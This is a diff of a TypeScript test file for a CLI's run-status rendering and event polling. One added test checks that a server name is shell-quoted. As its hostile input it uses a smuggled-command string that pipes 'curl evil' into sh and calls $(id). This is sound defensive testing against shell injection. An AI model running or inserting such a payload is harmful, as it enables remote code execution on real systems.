@@ -1,5 +1,5 @@
 import { Command } from "commander";
-import { RUN_ACTIONS, buildCreateRequest, buildListRequest, buildRequest, confirmHint, formatEvent, formatStatus, isTerminal, register, watchRun, type RunView } from "./run";
+import { RUN_ACTIONS, buildCreateRequest, buildListRequest, buildRequest, confirmHint, formatEvent, formatStatus, isTerminal, register, shellQuote, watchRun, type RunView } from "./run";
 
 const PLAN = "a".repeat(32);
 const HASH = "b".repeat(64);
@@ -197,8 +197,10 @@ describe("rendering", () => {
         },
       }),
     ).join("\n");
-    expect(lines).toContain(`tugra import run approve run1 VERIFY --hash ${HASH} --ack x --confirm "tugra-box coolify.example.com" --accept-data-risk`);
+    expect(lines).toContain(`tugra import run approve run1 VERIFY --hash ${HASH} --ack x --confirm 'tugra-box coolify.example.com' --accept-data-risk`);
     expect(lines).toContain("POINT OF NO RETURN");
+    expect(lines).toContain("refused over MCP");
+    expect(lines).not.toContain("an agent cannot");
     expect(lines).toContain("valid for 30 min");
     expect(lines).toContain("point of no return: not reached");
   });
@@ -211,6 +213,23 @@ describe("rendering", () => {
     expect(lines).toContain("source.quiesced");
     expect(lines).toContain("failed: import.failed at IMPORT");
     expect(lines).toContain("PREFLIGHT");
+  });
+
+  it("a hostile server name stays one literal argument in the printed approve command", () => {
+    const evil = `x"; curl evil|sh; $(id) \`id\` it's`;
+    const lines = formatStatus(
+      view({
+        targetServerName: evil,
+        nextAction: {
+          kind: "approval", stepKey: "FREEZE", code: "approval.required", since: "t",
+          approval: { inputHash: HASH, ponr: false, confirm: "target-server", ttlSec: 0, requiresDataRisk: false, ackable: [], requiredAcks: [] },
+        },
+      }),
+    ).join("\n");
+    expect(lines).toContain(`--confirm ${shellQuote(evil)}`);
+    expect(lines).not.toContain(`--confirm "`);
+    expect(shellQuote("it's")).toBe(`'it'\\''s'`);
+    expect(shellQuote("plain name")).toBe("'plain name'");
   });
 
   it("isTerminal", () => {
@@ -235,7 +254,8 @@ describe("watchRun", () => {
           paths.push(p);
           const step = script[Math.min(i, script.length - 1)];
           if (p.includes("/events")) {
-            const events = step.events.map((e) => ({ ...e, at: "t", stepKey: null, level: "info", params: null }));
+            const afterSeq = Number(/afterSeq=(\d+)/.exec(p)?.[1] ?? 0);
+            const events = step.events.filter((e) => e.seq > afterSeq).map((e) => ({ ...e, at: "t", stepKey: null, level: "info", params: null }));
             if (events.length) lastSeq = events[events.length - 1].seq;
             return { events, lastSeq, hasMore: false };
           }
@@ -254,7 +274,7 @@ describe("watchRun", () => {
     const v = await watchRun("r1", { interval: 2 }, h.deps);
     expect(v.status).toBe("COMPLETED");
     expect(h.written).toHaveLength(3);
-    expect(h.paths.filter((p) => p.includes("/events")).map((p) => p.split("?")[1])).toEqual(["afterSeq=0&limit=500", "afterSeq=2&limit=500"]);
+    expect(h.paths.filter((p) => p.includes("/events")).map((p) => p.split("?")[1])).toEqual(["afterSeq=0&limit=500", "afterSeq=2&limit=500", "afterSeq=3&limit=500"]);
     expect(h.slept).toEqual([2000]);
   });
 
@@ -267,6 +287,25 @@ describe("watchRun", () => {
     const v = await watchRun("r1", { interval: 1, untilWaiting: true }, h.deps);
     expect(v.nextAction.kind).toBe("approval");
     expect(h.slept).toHaveLength(2);
+  });
+
+  it("an event appended between the events fetch and the view fetch is still printed at a terminal status", async () => {
+    const written: string[] = [];
+    let eventCalls = 0;
+    const deps = {
+      write: (l: string) => void written.push(l),
+      sleep: async () => undefined,
+      get: async (p: string) => {
+        if (p.includes("/events")) {
+          eventCalls++;
+          const events = eventCalls === 1 ? [{ seq: 1, code: "step.done" }] : [{ seq: 2, code: "run.completed" }];
+          return { events: events.map((e) => ({ ...e, at: "t", stepKey: null, level: "info", params: null })), lastSeq: events[0].seq, hasMore: false };
+        }
+        return view({ status: "COMPLETED", nextAction: { kind: "none", stepKey: null, code: "x", since: "t" } });
+      },
+    };
+    await watchRun("r1", { interval: 1 }, deps);
+    expect(written.map((l) => l.includes("run.completed"))).toEqual([false, true]);
   });
 
   it("maxPolls bounds the loop", async () => {
